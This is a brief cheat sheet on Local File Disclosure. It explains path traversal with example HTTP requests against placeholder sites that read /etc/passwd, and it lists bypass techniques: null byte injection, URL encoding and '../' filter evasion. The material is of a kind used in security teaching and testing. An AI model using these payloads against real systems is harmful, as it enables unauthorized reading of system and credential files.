# Local File Disclosure
The File Disclosure vulnerability allows an attacker to include a file, usually expliting a "dynamic file read" mechanisms implemented in the target application. The vulnerability occurs due to the user of user-supplied input without proper validation. (OWASP)
- Allows to read configuration files on host machine
- Read Arbitrary Files on the box (like /etc/passwd)
- Information Disclosure(limited to host's root directory) in some cases.


## Example
> GET http://mybankingsite.com/view_files?image=/images/myavatar.jpeg HTTP/1.1

> GET http://mybankingsite.com/view_file?image=../../../../../etc/passwd HTTP/1.1

## Path Traversal 
GET mybankingsite.com/view_file?image=../../../../../../etc/passwd HTTP/1.1
nobody:\*:-2:-2:Unprivileged User:/var/emty:/usr/bin/false
root:\*:0:0:System Administrator:/var/root:/bin/sh
daemon:\*:1:1:System Services:/var/root:/usr/bin/false

## How to find LFD
- It's not always this easy, sometimes you may have to traverse out of the current directory.
- Sometimes the application my expect an extension or will automatically add it to the end of the request for example:

	`GET http://mybankingsite.com/transaction?u=myusername HTTP/1.1`
	Will spit out a CSV file named myusername.csv
	
- This can be bypassed by adding a nullbyte(%00), in some cases by adding a "?" or other characters, depending on how the application works:

	`GET http://mybankingsite.com/transactions?u=/etc/passwd?%00 HTTP/1.1`
	This may give us the contents for /etc/passwd by ignoring the csv extension

## Null Byte Injection
Null Byte Injection (%00) or a ? mark, to ignore the remainder of the string but we may have to deal with other limitations or filtering in place:

- URL encoding:
	- . = %2e
	- / = %2f
	- ../ = %2e%2e%2f

- Bypass filter for "../":
	- ..././ = ../
	- ....// = ../
	- Get creatvie!

- Example:
	- http://cryptosite.com/download_earnings?u=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00csv HTTP/1.1
